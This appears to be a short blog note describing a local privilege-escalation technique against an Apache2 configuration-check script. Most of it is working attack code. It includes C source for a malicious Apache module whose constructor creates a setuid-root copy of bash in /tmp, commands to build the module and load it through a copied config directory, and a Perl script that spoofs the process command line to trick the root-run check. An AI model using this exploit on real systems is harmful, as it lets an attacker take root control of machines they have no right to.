+++
date = '2026-11-16T11:19:00+06:30'
title = 'PrivTechnique'
cover = '/images/covers/45.png'
+++

## apache2

```bash
#!/usr/bin/bash
RET=0
while read pid _cmd ; do
	# Replace apache2 with apache2ctl and add -t for test
	cmd="${_cmd/apache2/apache2ctl} -t"
	$cmd >/dev/null 2>&1
	RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
	echo 'Configuration correct. \o/'
else
	echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET

here this is finding same command name line with /opt/zroweb blah blah so we need to create fake command line with the same process name
```

```c
fucker.c

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

static void myinit(apr_pool_t *p, server_rec *s) {
    system("cp /bin/bash /tmp/fucker; chown root:root /tmp/fucker; chmod 6777 /tmp/fucker");
}

module AP_MODULE_DECLARE_DATA mymodule = {
            STANDARD20_MODULE_STUFF,
                NULL, NULL, NULL, NULL, NULL,
                    NULL
};

__attribute__((constructor))
        static void _init() { myinit(NULL, NULL); }

#------------------------------------------------------

apxs fucker.c
```

```bash
malicious module
cp -R /etc/apache2/ /dev/shm/fucker
mkdir /dev/shm/fucker/libs_hook
cp fucker.so /dev/shm/fucker/libs_hook/

vim /dev/shm/fucker/apache2.conf -> add this line 'LoadModule fucker libs_hook/fucker.so'

```

```bash
creating fake process

#!/bin/perl
$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d [our_exploit_path] -c";
sleep(223);
```





